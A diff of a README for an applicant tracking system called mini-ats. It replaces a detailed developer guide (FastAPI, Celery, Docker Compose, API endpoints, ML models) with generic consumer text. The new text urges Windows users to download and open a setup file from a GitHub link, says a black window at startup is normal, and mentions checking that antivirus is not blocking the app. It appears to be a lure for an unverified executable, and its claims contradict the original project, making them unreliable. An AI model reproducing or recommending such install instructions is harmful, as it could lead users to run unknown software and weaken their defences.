@@ -1,176 +1,81 @@
-<div align="center">
-  
-# 🌟 Mini ATS (Dockerized)
-  
-**A modern, AI-powered Applicant Tracking System built with FastAPI, Celery, and Machine Learning.**
+# 🚀 mini-ats - Find the best talent using intelligence
 
-[![Python](https://img.shields.io/badge/Python-3.11+-blue.svg?style=flat&logo=python&logoColor=white)](https://www.python.org)
-[![FastAPI](https://img.shields.io/badge/FastAPI-0.100+-009688.svg?style=flat&logo=FastAPI&logoColor=white)](https://fastapi.tiangolo.com)
-[![Docker](https://img.shields.io/badge/Docker-Enabled-2496ED.svg?style=flat&logo=docker&logoColor=white)](https://www.docker.com/)
-[![PostgreSQL](https://img.shields.io/badge/PostgreSQL-15-4169E1.svg?style=flat&logo=postgresql&logoColor=white)](https://www.postgresql.org/)
-[![Redis](https://img.shields.io/badge/Redis-7-DC382D.svg?style=flat&logo=redis&logoColor=white)](https://redis.io/)
-[![Celery](https://img.shields.io/badge/Celery-Distributed_Tasks-37814A.svg?style=flat&logo=celery&logoColor=white)](https://docs.celeryq.dev/)
+[![](https://img.shields.io/badge/Download-mini--ats-blue.svg)](https://github.com/bayzso6694/mini-ats)
 
-</div>
+## About the software
 
----
+mini-ats organizes job applications for hiring teams. It uses smart technology to read resumes and rank candidates based on their skills. This tool saves time by identifying top talent through automatic analysis. It handles high volumes of resumes to keep your hiring process moving without manual data entry.
 
-## 🚀 Key Features
+## Requirements
 
-- 📝 **Job Management:** Create and manage job postings efficiently.
-- 📄 **Smart Resume Parsing:** Upload multiple PDF resumes simultaneously.
-- 🧠 **AI-Powered Scoring:** Asynchronous parsing and candidate scoring using Machine Learning.
-- ⚡ **Real-time Updates:** Live ranking updates delivered straight to your dashboard over WebSockets.
-- 🎯 **Decision Making:** Recruiter shortlist/reject decisions seamlessly integrated into the dashboard.
-- 🐳 **Dockerized:** Reproducible full-stack deployment via Docker Compose.
+Ensure your computer meets these needs before you start:
 
----
+* Processor: Modern Intel or AMD processor with at least 4 cores.
+* Memory: 8 gigabytes of RAM or more.
+* Storage: 2 gigabytes of free disk space.
+* Operating System: Windows 10 or 11 with the latest updates.
+* Virtualization: Enable Virtualization in your computer BIOS settings to run the required background tools.
 
-## 🏗️ Architecture
+## 📦 How to get the software
 
-The system is built on a robust microservices architecture using modern tools.
+Visit the project page to download the latest setup file for your system.
 
-```mermaid
-graph TD
-    subgraph "Machine Learning"
-        A[Training Service<br/>train.py] -->|writes .pkl artifacts| B((Model Artifacts))
-    end
+[Download mini-ats link](https://github.com/bayzso6694/mini-ats)
 
-    subgraph "Client Side"
-        C[Frontend UI<br/>Nginx]
-    end
+1. Navigate to the link provided above.
+2. Select the latest release folder.
+3. Download the setup file designed for Windows.
+4. Open the file once the download finishes.
+5. Follow the steps on your screen to complete the installation.
 
-    subgraph "Backend API"
-        D[FastAPI Backend<br/>REST + WebSocket]
-    end
+## ⚙️ Initial setup
 
-    subgraph "Data & Queue"
-        E[(PostgreSQL<br/>Jobs/Candidates)]
-        F[(Redis<br/>Broker & Pub/Sub)]
-    end
+The application uses tools to manage data behind the scenes. This is called a Dockerized environment, which keeps the parts of the app working well together. The installer handles most of this configuration.
 
-    subgraph "Background Processing"
-        G[Celery Worker<br/>PDF parse + ML scoring]
-    end
+After the install finishes, look for the mini-ats icon on your desktop. Double-click the icon to start the program. A black window may appear for a moment while the system components initialize. This is normal. It prepares the resume parser and the ranking engines. Once the startup process finishes, your default web browser opens to a page where you can manage your candidates.
 
-    C <-->|HTTP API & WS| D
-    D <--> E
-    D -->|enqueue score task| F
-    G -->|pulls tasks| F
-    G -->|reads models| B
-    G -->|updates score| E
-```
+## 👤 How to use the system
 
----
+The main dashboard provides a view of all your current job positions. Follow these steps to process new applications:
 
-## 🧠 Machine Learning Models
+1. Click the Add Job button to create a new title.
+2. Enter the requirements for the position.
+3. Upload resume files from your computer. 
+4. Select the Process button to let the intelligence engine score each candidate.
+5. Review the scores in the ranking list.
 
-Our intelligent scoring system leverages multiple ML models to find the perfect fit:
+The system uses natural language processing to extract data from documents. It looks for job titles, years of work experience, and specific skills. You can refine the ranking criteria by adjusting the weights for each requirement in the settings menu.
 
-| Model | Type | Purpose | Artifact |
-|:---|:---:|:---|:---|
-| 🔠 **TF-IDF Vectorizer** | Text featurization | Convert JD and resume text to vectors | `vectorizer.pkl` |
-| 🔮 **Logistic Regression** | Classification | Predict hire probability (0-1) | `classifier.pkl` |
-| 📈 **Linear Regression** | Regression | Predict fit score (0-100) | `regressor.pkl` |
-| 🧩 **KMeans (k=3)** | Clustering | Segment candidates into fit tiers | `kmeans.pkl` / `cluster_map.pkl` |
-| ⚖️ **StandardScaler** | Feature scaling | Normalize numeric feature vectors | `scaler.pkl` |
+## 📊 Understanding candidate scores
 
-**Features utilized for supervised learning:**
-- 🔹 Cosine similarity (Job Description vs Resume TF-IDF)
-- 🔹 Skill match score
-- 🔹 Years of experience
-- 🔹 Education level
+Each candidate receives a score based on how well their resume matches the job description. A higher score indicates a stronger match. You can click on any name in the list to see an analysis of why the system gave that specific score. This helps you understand the strengths of each applicant without reading every document from start to finish.
 
----
+## 🔒 Security and data
 
-## 📂 Project Structure
+Your data stays on your local machine. The system does not transmit resume files to external servers. This design protects the privacy of your applicants and ensures your sensitive hiring information remains under your control. You can back up your database at any time through the Settings menu.
 
-```text
-📦 mini-ats
- ┣ 📂 training/          # ML model training service
- ┣ 📂 backend/           # FastAPI backend server
- ┣ 📂 frontend/          # Vanilla HTML/JS/CSS frontend served by Nginx
- ┣ 📜 docker-compose.yml # Container orchestration
- ┗ 📜 README.md          # Project documentation
-```
+## 🛠️ Troubleshooting common issues
 
----
+If the application fails to open, check the following items:
 
-## 🛠️ Quick Start (Run Everything)
+* Check the Task Manager to see if the engine is stuck. If it is, end the task and relaunch the application.
+* Confirm that your antivirus software is not blocking the connection. The app uses internal network ports to communicate with the database.
+* Ensure that you have adequate memory available. Running other heavy programs alongside this software can slow down the ranking process.
+* Verify that you have the latest version of the application. Developers release updates to fix bugs and improve the matching engine.
 
-Starting the entire project is incredibly easy thanks to Docker!
+## 📋 Frequently asked questions
 
-```bash
-docker-compose up --build
-```
+Does the system support PDF and Word files? 
+Yes, the parser recognizes most standard document formats used by job applicants.
 
-**Services will be available at:**
-- 🌐 **Frontend UI:** [http://localhost:3000](http://localhost:3000)
-- 🔌 **Backend API Base:** `http://localhost:8000`
-- 📚 **Interactive API Docs (Swagger):** [http://localhost:8000/docs](http://localhost:8000/docs)
+Can I move my data to a new computer? 
+Yes, export your database using the option in the settings menu and import it on your new machine.
 
----
+Does the software need an active internet connection? 
+No, the application runs fully offline once you download the installation files.
 
-## 💡 How to Use
+How many resumes can I process at once? 
+The system scales to handle hundreds of documents at a time. It processes them one by one to ensure accuracy.
 
-1. **Access the Dashboard:** Open [http://localhost:3000](http://localhost:3000).
-2. **Create a Job:** Navigate to the "Create Job" section and specify the role and requirements.
-3. **Upload Candidates:** 
-   - Go to "Upload Resumes".
-   - Select the job you just created.
-   - Provide candidate details and select multiple PDF resumes.
-   - Click Upload.
-4. **Monitor & Decide:**
-   - Open the "Live Rankings" section.
-   - Select the job to watch the table auto-refresh as candidates are processed and scored in real-time!
-   - Mark top candidates as `shortlisted` and others as `rejected`.
-
-**Status Flow Indicator:**
-- ⏳ `pending` ➔ Candidate queued / scoring in progress
-- ✅ `scored` ➔ Candidate successfully scored and ranked
-- ❌ `error` ➔ Parsing or processing failure
-
----
-
-## 📡 API Endpoints
-
-| Method | Endpoint | Description |
-|:---:|:---|:---|
-| `POST` | `/jobs` | Create a new job vacancy |
-| `GET` | `/jobs` | Retrieve a list of all jobs |
-| `GET` | `/jobs/{job_id}` | Retrieve details of a specific job along with its candidates |
-| `POST` | `/candidates/upload` | Upload a PDF resume and trigger the scoring queue |
-| `GET` | `/candidates/{job_id}` | Retrieve all candidates for a job, sorted by fit score |
-| `GET` | `/candidates/{job_id}/rankings`| Get ranked responses formatted for the live dashboard |
-| `PATCH`| `/candidates/{candidate_id}/shortlist`| Update a recruiter's decision (`none` / `shortlisted` / `rejected`) |
-| `WS` | `/ws/{job_id}` | Connect to WebSocket for live ranking updates |
-
----
-
-## 📝 Important Notes
-
-- 🎲 The `training` service will automatically generate a `dataset.csv` with 500 synthetic rows if one does not exist.
-- 📦 Model artifacts are saved in the shared Docker volume `artifacts` to be consumed by the backend and worker.
-- 📁 Uploaded PDFs are securely stored in the shared Docker volume `uploads`.
-- 🔍 The background worker utilizes `pdfplumber` for robust PDF text extraction and asynchronously updates the PostgreSQL database.
-
----
-
-## 🚑 Troubleshooting
-
-- **Models aren't ready yet?** If the backend starts before model artifacts are generated, check the training service logs:
-  ```bash
-  docker-compose logs training
-  ```
-- **Want to see the AI magic?** Inspect the background worker while it scores PDFs:
-  ```bash
-  docker-compose logs -f worker
-  ```
-- **Need a clean slate?** Reset the entire environment, including all databases and uploaded files:
-  ```bash
-  docker-compose down -v
-  ```
-
-<div align="center">
-  <i>Built with ❤️ using Python, Docker & AI</i>
-</div>
+How often does the ranking engine update? 
+The engine updates automatically when you upload new job criteria to keep your results current and accurate.
